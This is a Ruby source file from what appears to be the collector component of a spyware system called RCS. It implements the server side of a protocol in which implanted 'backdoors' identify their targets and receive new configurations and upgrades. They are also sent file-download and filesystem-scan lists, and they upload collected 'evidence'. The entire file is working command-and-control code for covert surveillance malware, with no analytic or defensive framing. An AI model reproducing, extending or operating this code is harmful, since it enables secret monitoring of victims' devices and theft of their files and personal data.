#
#  Command parsing or the protocol (to be mixed-in in protocol)
#

# relatives
require_relative 'db.rb'
require_relative 'sessions.rb'
require_relative 'evidence_transfer.rb'

# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/pascalize'
require 'rcs-common/evidence_manager'

# system

module RCS
module Collector

module Commands

  # the commands are depicted here: http://rcs-dev/trac/wiki/RCS_Sync_Proto_Rest

  INVALID_COMMAND  = 0x00       # Don't use
  PROTO_OK         = 0x01       # OK
  PROTO_NO         = 0x02       # Nothing available
  PROTO_BYE        = 0x03       # The end of the protocol
  PROTO_ID         = 0x0f       # Identification of the target
  PROTO_CONF       = 0x07       # New configuration
  PROTO_UNINSTALL  = 0x0a       # Uninstall command
  PROTO_DOWNLOAD   = 0x0c       # List of files to be downloaded
  PROTO_UPLOAD     = 0x0d       # A file to be saved
  PROTO_UPGRADE    = 0x16       # Upgrade for the backdoor
  PROTO_EVIDENCE   = 0x09       # Upload of an evidence
  PROTO_FILESYSTEM = 0x19       # List of paths to be scanned

  LOOKUP = { PROTO_ID => :command_id,
             PROTO_CONF => :command_conf,
             PROTO_UPLOAD => :command_upload,
             PROTO_DOWNLOAD => :command_download,
             PROTO_FILESYSTEM => :command_filesystem,
             PROTO_UPGRADE => :command_upgrade,
             PROTO_EVIDENCE => :command_evidence,
             PROTO_BYE => :command_bye}

  # Protocol Identification
  # -> PROTO_ID  [Version, UserId, DeviceId, SourceId]
  # <- PROTO_OK, Time, Availables
  def command_id(peer, session, message)

    # backdoor version
    version = message.slice!(0..3).unpack('I').first

    # ident of the target
    user_id, device_id, source_id = message.unpascalize_ary

    # if the source id cannot be determined by the client, set it to the ip address
    source_id = peer if source_id.eql? ''

    trace :info, "[#{peer}][#{session[:cookie]}] Identification: #{version} '#{user_id}' '#{device_id}' '#{source_id}'"

    # get the time in UTC
    now = Time.now - Time.now.utc_offset

    # notify the database that the sync is in progress
    DB.sync_start session, version, user_id, device_id, source_id, now

    # notify the Evidence Manager that the sync is in progress
    EvidenceManager.sync_start session, version, user_id, device_id, source_id, now

    # response to the request
    command = [PROTO_OK].pack('I')

    # the time of the server to synchronize the clocks
    time = [Time.now.to_i].pack('Q')

    available = ""
    # ask to the db if there are any availables for the backdoor
    # the results are actually downloaded and saved locally
    # we will retrieve the content when the backdoor ask for them later
    if DB.new_conf? session[:bid] then
      available += [PROTO_CONF].pack('I')
      trace :info, "[#{peer}][#{session[:cookie]}] Available: New config"
    end
    if DB.new_upgrade? session[:bid]
      available += [PROTO_UPGRADE].pack('I')
      trace :info, "[#{peer}][#{session[:cookie]}] Available: New upgrade"
    end
    if DB.new_downloads? session[:bid] then
      available += [PROTO_DOWNLOAD].pack('I')
      trace :info, "[#{peer}][#{session[:cookie]}] Available: New downloads"
    end
    if DB.new_uploads? session[:bid] then
      available += [PROTO_UPLOAD].pack('I')
      trace :info, "[#{peer}][#{session[:cookie]}] Available: New uploads"
    end
    if DB.new_filesystems? session[:bid]
      available += [PROTO_FILESYSTEM].pack('I')
      trace :info, "[#{peer}][#{session[:cookie]}] Available: New filesystems"
    end

    # calculate the total size of the response
    tot = time.length + 4 + available.length

    # prepare the response
    response = command + [tot].pack('I') + time + [available.length / 4].pack('I') + available

    return response
  end

  # Protocol End
  # -> PROTO_BYE
  # <- PROTO_OK
  def command_bye(peer, session, message)

    # notify the database that the sync is ended
    DB.sync_end session[:bid]
    
    # notify the Evidence Manager that the sync has ended
    EvidenceManager.sync_end session

    # destroy the current session
    SessionManager.delete(session[:cookie])

    trace :info, "[#{peer}][#{session[:cookie]}] Synchronization completed"

    return [PROTO_OK].pack('I') + [0].pack('I')
  end

  # Protocol Conf
  # -> PROTO_CONF
  # <- PROTO_NO | PROTO_OK [ Conf ]
  def command_conf(peer, session, message)
    trace :info, "[#{peer}][#{session[:cookie]}] Configuration request"

    # the conf was already retrieved (if any) during the ident phase
    # here we get just the content (locally) without asking again to the db
    conf = DB.new_conf session[:bid]

    # send the response
    if conf.nil? then
      trace :info, "[#{peer}][#{session[:cookie]}] NO new configuration"
      response = [PROTO_NO].pack('I')
    else
      trace :info, "[#{peer}][#{session[:cookie]}] New configuration (#{conf.length} bytes)"
      response = [PROTO_OK].pack('I') + [conf.length].pack('I') + conf
    end

    return response
  end

  # Protocol Upload
  # -> PROTO_UPLOAD
  # <- PROTO_NO | PROTO_OK [ left, filename, content ]
  def command_upload(peer, session, message)
    trace :info, "[#{peer}][#{session[:cookie]}] Upload request"

    # the upload list was already retrieved (if any) during the ident phase
    # here we get just the content (locally) without asking again to the db
    # the database will output one upload at a time and the 'left' number of file
    # we pass it to the backdoor which will request again if left is greater than zero
    upload, left = DB.new_uploads session[:bid]

    # send the response
    if upload.nil? then
      trace :info, "[#{peer}][#{session[:cookie]}] NO uploads"
      response = [PROTO_NO].pack('I')
    else
      response = [PROTO_OK].pack('I')

      content = [left].pack('I')                     # number of uploads still waiting in the db
      content += upload[:filename].pascalize         # filename
      content += [upload[:content].length].pack('I') # file size
      content += upload[:content]                    # file content

      response += [content.length].pack('I') + content

      trace :info, "[#{peer}][#{session[:cookie]}] [#{upload[:filename]}][#{upload[:content].length}] sent (#{left} left)"
    end

    return response
  end

    # Protocol Upgrade
  # -> PROTO_UPGRADE
  # <- PROTO_NO | PROTO_OK [ left, filename, content ]
  def command_upgrade(peer, session, message)
    trace :info, "[#{peer}][#{session[:cookie]}] Upgrade request"

    # the upgrade list was already retrieved (if any) during the ident phase (like upload)
    upgrade, left = DB.new_upgrade session[:bid]

    # send the response
    if upgrade.nil? then
      trace :info, "[#{peer}][#{session[:cookie]}] NO upgrade"
      response = [PROTO_NO].pack('I')
    else
      response = [PROTO_OK].pack('I')

      content = [left].pack('I')                      # number of upgrades still waiting in the db
      content += upgrade[:filename].pascalize         # filename
      content += [upgrade[:content].length].pack('I') # file size
      content += upgrade[:content]                    # file content

      response += [content.length].pack('I') + content

      trace :info, "[#{peer}][#{session[:cookie]}] [#{upgrade[:filename]}][#{upgrade[:content].length}] sent (#{left} left)"
    end

    return response
  end

  # Protocol Download
  # -> PROTO_DOWNLOAD
  # <- PROTO_NO | PROTO_OK [ numElem, [file1, file2, ...]]
  def command_download(peer, session, message)
    trace :info, "[#{peer}][#{session[:cookie]}] Download request"

    # the download list was already retrieved (if any) during the ident phase
    # here we get just the content (locally) without asking again to the db
    downloads = DB.new_downloads session[:bid]

    # send the response
    if downloads.empty? then
      trace :info, "[#{peer}][#{session[:cookie]}] NO downloads"
      response = [PROTO_NO].pack('I')
    else
      response = [PROTO_OK].pack('I')
      list = ""
      # create the list of patterns to download
      downloads.each do |dow|
        trace :info, "[#{peer}][#{session[:cookie]}] #{dow}"
        list += dow.pascalize
      end
      response += [list.length + 4].pack('I') + [downloads.size].pack('I') + list
      trace :info, "[#{peer}][#{session[:cookie]}] #{downloads.size} download requests sent"
    end

    return response
  end

  # Protocol Filesystem
  # -> PROTO_FILESYSTEM
  # <- PROTO_NO | PROTO_OK [ numElem,[ depth1, dir1, depth2, dir2, ... ]]
  def command_filesystem(peer, session, message)
    trace :info, "[#{peer}][#{session[:cookie]}] Filesystem request"

    # the filesystem list was already retrieved (if any) during the ident phase
    # here we get just the content (locally) without asking again to the db
    filesystems = DB.new_filesystems session[:bid]

    # send the response
    if filesystems.empty? then
      trace :info, "[#{peer}][#{session[:cookie]}] NO filesystem"
      response = [PROTO_NO].pack('I')
    else
      response = [PROTO_OK].pack('I')
      list = ""
      # create the list of patterns to download
      filesystems.each do |fs|
        trace :info, "[#{peer}][#{session[:cookie]}] #{fs[:depth]} #{fs[:path]}"
        list += [fs[:depth]].pack('I') + fs[:path].pascalize
      end
      response += [list.length + 4].pack('I') + [filesystems.size].pack('I') + list
      trace :info, "[#{peer}][#{session[:cookie]}] #{filesystems.size} filesystem requests sent"
    end

    return response
  end

  # Protocol Evidence
  # -> PROTO_EVIDENCE [ size, content ]
  # <- PROTO_OK | PROTO_NO
  def command_evidence(peer, session, message)

    # get the file size
    size = message.slice!(0..3).unpack('I').first

    # send the evidence to the db
    begin
      # store the evidence in the db
      id = EvidenceManager.store_evidence session, size, message

      # notify the transfer manager that an evidence is available
      EvidenceTransfer.queue session[:instance], id

      trace :info, "[#{peer}][#{session[:cookie]}] Evidence saved (#{size} bytes)"
    rescue Exception => e
      trace :warn, "[#{peer}][#{session[:cookie]}] Evidence NOT saved: #{e.message}"
      return [PROTO_NO].pack('I')
    end

    return [PROTO_OK].pack('I') + [0].pack('I')
  end

end #Commands

end #Collector::
end #RCS::